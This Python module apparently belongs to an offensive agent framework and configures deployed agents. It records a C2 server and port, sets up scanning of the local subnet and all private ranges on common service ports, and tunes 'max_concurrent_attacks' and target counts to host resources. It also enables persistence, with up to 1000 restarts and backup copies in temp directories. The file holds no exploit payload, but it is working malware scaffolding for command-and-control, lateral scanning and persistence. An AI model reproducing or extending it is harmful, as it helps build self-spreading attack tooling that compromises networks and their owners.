"""
AUTO CONFIGURATOR MODULE

Handles automatic configuration of deployed agents:
- Platform detection and optimization
- Network configuration
- C2 server setup
- Performance tuning
- Resource optimization
"""

import os
import sys
import json
import socket
import platform
import subprocess
import logging
import threading
from typing import Dict, Optional, Any
from dataclasses import dataclass
from pathlib import Path
from datetime import datetime

logger = logging.getLogger(__name__)


@dataclass
class SystemConfiguration:
    """System configuration parameters"""
    agent_id: str
    platform: str
    architecture: str
    hostname: str
    ip_address: str
    cpu_count: int
    memory_gb: float
    disk_space_gb: float
    config_time: str


class AutoConfigurator:
    """
    AUTO CONFIGURATOR
    
    Automatically configures deployed agents for optimal operation:
    - Detects system capabilities
    - Optimizes performance parameters
    - Configures network settings
    - Sets up C2 communication
    - Enables persistence
    """
    
    def __init__(self, config_file: str = "config.json"):
        """
        Initialize auto configurator
        
        Args:
            config_file: Path to configuration file
        """
        self.config_file = config_file
        self.config = {}
        self.system_config = None
        self.lock = threading.Lock()
        
        logger.info(f"AutoConfigurator initialized")
    
    def auto_configure(self, agent_id: str, c2_server: str, c2_port: int) -> Dict:
        """
        Automatically configure agent for optimal operation
        
        Args:
            agent_id: Agent ID
            c2_server: C2 server address
            c2_port: C2 server port
            
        Returns:
            Configuration dictionary
        """
        logger.info(f"[AutoConfig] Starting automatic configuration for {agent_id}...")
        
        try:
            # Step 1: Detect system capabilities
            self.system_config = self._detect_system_capabilities(agent_id)
            logger.info(f"[AutoConfig] System detected: {self.system_config.platform} {self.system_config.architecture}")
            
            # Step 2: Load or create configuration
            self.config = self._load_or_create_config(agent_id, c2_server, c2_port)
            
            # Step 3: Optimize configuration based on system
            self._optimize_configuration()
            
            # Step 4: Configure network settings
            self._configure_network()
            
            # Step 5: Configure performance parameters
            self._configure_performance()
            
            # Step 6: Configure persistence
            self._configure_persistence()
            
            # Step 7: Verify configuration
            self._verify_configuration()
            
            # Step 8: Save configuration
            self._save_configuration()
            
            logger.info(f"[AutoConfig] ✅ Configuration complete")
            
            return self.config
            
        except Exception as e:
            logger.error(f"[AutoConfig] ❌ Configuration failed: {e}")
            raise
    
    def _detect_system_capabilities(self, agent_id: str) -> SystemConfiguration:
        """
        Detect system capabilities
        
        Args:
            agent_id: Agent ID
            
        Returns:
            SystemConfiguration object
        """
        logger.info(f"[AutoConfig] Detecting system capabilities...")
        
        # Get platform information
        system_platform = platform.system()
        architecture = platform.machine()
        hostname = socket.gethostname()
        
        # Get IP address
        ip_address = self._get_local_ip()
        
        # Get CPU count
        cpu_count = os.cpu_count() or 1
        
        # Get memory
        memory_gb = self._get_memory_gb()
        
        # Get disk space
        disk_space_gb = self._get_disk_space_gb()
        
        system_config = SystemConfiguration(
            agent_id=agent_id,
            platform=system_platform,
            architecture=architecture,
            hostname=hostname,
            ip_address=ip_address,
            cpu_count=cpu_count,
            memory_gb=memory_gb,
            disk_space_gb=disk_space_gb,
            config_time=datetime.now().isoformat()
        )
        
        logger.info(f"[AutoConfig] System detected:")
        logger.info(f"[AutoConfig]   Platform: {system_platform}")
        logger.info(f"[AutoConfig]   Architecture: {architecture}")
        logger.info(f"[AutoConfig]   Hostname: {hostname}")
        logger.info(f"[AutoConfig]   IP: {ip_address}")
        logger.info(f"[AutoConfig]   CPU: {cpu_count} cores")
        logger.info(f"[AutoConfig]   Memory: {memory_gb:.2f} GB")
        logger.info(f"[AutoConfig]   Disk: {disk_space_gb:.2f} GB")
        
        return system_config
    
    def _get_local_ip(self) -> str:
        """Get local IP address"""
        try:
            # Create socket to determine local IP
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            ip_address = s.getsockname()[0]
            s.close()
            return ip_address
        except:
            return "127.0.0.1"
    
    def _get_memory_gb(self) -> float:
        """Get system memory in GB"""
        try:
            if self.system_config and self.system_config.platform == 'Linux':
                # Read from /proc/meminfo
                with open('/proc/meminfo', 'r') as f:
                    meminfo = f.read()
                    for line in meminfo.split('\n'):
                        if line.startswith('MemTotal:'):
                            mem_kb = int(line.split()[1])
                            return mem_kb / (1024 * 1024)
            else:
                # Default assumption
                return 8.0
        except:
            return 8.0
    
    def _get_disk_space_gb(self) -> float:
        """Get available disk space in GB"""
        try:
            import shutil
            disk_usage = shutil.disk_usage('/')
            return disk_usage.free / (1024**3)
        except:
            return 100.0
    
    def _load_or_create_config(self, agent_id: str, c2_server: str, c2_port: int) -> Dict:
        """
        Load existing config or create new one
        
        Args:
            agent_id: Agent ID
            c2_server: C2 server address
            c2_port: C2 server port
            
        Returns:
            Configuration dictionary
        """
        logger.info(f"[AutoConfig] Loading or creating configuration...")
        
        # Try to load existing config
        if os.path.exists(self.config_file):
            try:
                with open(self.config_file, 'r') as f:
                    config = json.load(f)
                logger.info(f"[AutoConfig] Loaded existing configuration")
                return config
            except Exception as e:
                logger.warning(f"[AutoConfig] Failed to load config: {e}, creating new config")
        
        # Create new configuration
        config = {
            'agent_id': agent_id,
            'agent_type': 'deployed',
            'c2_server': c2_server,
            'c2_port': c2_port,
            'auto_start': True,
            'persistence_enabled': True,
            'reporting_enabled': True,
            'scan_interval': 300,
            'max_targets': 50,
            'max_concurrent_attacks': 5,
            'use_ai': True,
            'use_explorer': True,
            'network_ranges': self._get_default_network_ranges(),
            'target_ports': [22, 80, 443, 8080, 3389, 3306, 5432],
            'heartbeat_interval': 60,
            'enabled_modules': []
        }
        
        logger.info(f"[AutoConfig] Created new configuration")
        
        return config
    
    def _get_default_network_ranges(self) -> list:
        """Get default network ranges to scan"""
        ip_address = self._get_local_ip()
        network_ranges = []
        
        # Add local network range
        if ip_address != "127.0.0.1":
            octets = ip_address.split('.')
            network_ranges.append(f"{octets[0]}.{octets[1]}.{octets[2]}.0/24")
        
        # Add common private ranges
        network_ranges.extend([
            '10.0.0.0/8',
            '172.16.0.0/12',
            '192.168.0.0/16'
        ])
        
        return network_ranges
    
    def _optimize_configuration(self):
        """Optimize configuration based on system capabilities"""
        logger.info(f"[AutoConfig] Optimizing configuration...")
        
        if not self.system_config:
            logger.warning(f"[AutoConfig] No system config, skipping optimization")
            return
        
        # Adjust concurrent attacks based on CPU count
        cpu_count = self.system_config.cpu_count
        self.config['max_concurrent_attacks'] = min(10, cpu_count * 2)
        logger.info(f"[AutoConfig] Max concurrent attacks: {self.config['max_concurrent_attacks']}")
        
        # Adjust max targets based on memory
        memory_gb = self.system_config.memory_gb
        if memory_gb >= 16:
            self.config['max_targets'] = 100
        elif memory_gb >= 8:
            self.config['max_targets'] = 50
        else:
            self.config['max_targets'] = 25
        logger.info(f"[AutoConfig] Max targets: {self.config['max_targets']}")
        
        # Enable AI if sufficient memory
        self.config['use_ai'] = memory_gb >= 4
        logger.info(f"[AutoConfig] AI enabled: {self.config['use_ai']}")
        
        # Enable explorer if sufficient memory and CPU
        self.config['use_explorer'] = memory_gb >= 8 and cpu_count >= 4
        logger.info(f"[AutoConfig] Explorer enabled: {self.config['use_explorer']}")
        
        # Adjust scan interval based on CPU
        if cpu_count >= 8:
            self.config['scan_interval'] = 180  # 3 minutes
        elif cpu_count >= 4:
            self.config['scan_interval'] = 300  # 5 minutes
        else:
            self.config['scan_interval'] = 600  # 10 minutes
        logger.info(f"[AutoConfig] Scan interval: {self.config['scan_interval']}s")
    
    def _configure_network(self):
        """Configure network settings"""
        logger.info(f"[AutoConfig] Configuring network settings...")
        
        # Configure C2 communication
        self.config['c2_communication'] = {
            'protocol': 'https',
            'encryption': 'aes-256-gcm',
            'compression': True,
            'retry_attempts': 3,
            'retry_delay': 5,
            'timeout': 30
        }
        
        # Configure network autodiscovery
        self.config['autodiscovery'] = {
            'enabled': True,
            'interval': 60,
            'scan_local_network': True,
            'scan_specific_ranges': False
        }
        
        logger.info(f"[AutoConfig] Network configuration complete")
    
    def _configure_performance(self):
        """Configure performance parameters"""
        logger.info(f"[AutoConfig] Configuring performance parameters...")
        
        # Configure resource limits
        self.config['performance'] = {
            'max_memory_mb': int(self.system_config.memory_gb * 1024 * 0.8),
            'max_cpu_percent': 80,
            'max_disk_usage_percent': 90,
            'thread_pool_size': self.system_config.cpu_count * 2
        }
        
        # Configure logging
        self.config['logging'] = {
            'level': 'INFO',
            'file': 'agent.log',
            'max_size_mb': 100,
            'backup_count': 5
        }
        
        logger.info(f"[AutoConfig] Performance configuration complete")
    
    def _configure_persistence(self):
        """Configure persistence settings"""
        logger.info(f"[AutoConfig] Configuring persistence settings...")
        
        self.config['persistence'] = {
            'enabled': True,
            'health_check_interval': 5,
            'max_restart_attempts': 1000,
            'restart_delay': 2,
            'backup_locations': self._get_backup_locations()
        }
        
        logger.info(f"[AutoConfig] Persistence configuration complete")
    
    def _get_backup_locations(self) -> list:
        """Get backup locations for the current platform"""
        platform = self.system_config.platform if self.system_config else 'Linux'
        
        if platform == 'Windows':
            return [
                os.environ.get('APPDATA', ''),
                os.environ.get('TEMP', ''),
                os.environ.get('LOCALAPPDATA', '')
            ]
        elif platform == 'Linux':
            return [
                '/var/tmp',
                '/tmp',
                '/usr/local/tmp'
            ]
        elif platform == 'Darwin':  # macOS
            return [
                '/tmp',
                '/private/tmp',
                '/var/tmp'
            ]
        else:
            return ['/tmp']
    
    def _verify_configuration(self):
        """Verify configuration is valid"""
        logger.info(f"[AutoConfig] Verifying configuration...")
        
        required_fields = [
            'agent_id',
            'c2_server',
            'c2_port',
            'auto_start',
            'persistence_enabled',
            'scan_interval',
            'max_targets'
        ]
        
        missing_fields = []
        for field in required_fields:
            if field not in self.config:
                missing_fields.append(field)
        
        if missing_fields:
            raise ValueError(f"Missing required configuration fields: {missing_fields}")
        
        logger.info(f"[AutoConfig] ✅ Configuration verified")
    
    def _save_configuration(self):
        """Save configuration to file"""
        logger.info(f"[AutoConfig] Saving configuration...")
        
        try:
            with open(self.config_file, 'w') as f:
                json.dump(self.config, f, indent=2)
            logger.info(f"[AutoConfig] ✅ Configuration saved to {self.config_file}")
        except Exception as e:
            logger.error(f"[AutoConfig] Failed to save configuration: {e}")
            raise
    
    def get_configuration(self) -> Dict:
        """Get current configuration"""
        with self.lock:
            return self.config.copy()
    
    def update_configuration(self, updates: Dict):
        """
        Update configuration with new values
        
        Args:
            updates: Dictionary of configuration updates
        """
        with self.lock:
            self.config.update(updates)
            self._save_configuration()
            logger.info(f"[AutoConfig] Configuration updated")
    
    def reload_configuration(self):
        """Reload configuration from file"""
        logger.info(f"[AutoConfig] Reloading configuration...")
        
        try:
            with open(self.config_file, 'r') as f:
                self.config = json.load(f)
            logger.info(f"[AutoConfig] ✅ Configuration reloaded")
        except Exception as e:
            logger.error(f"[AutoConfig] Failed to reload configuration: {e}")
            raise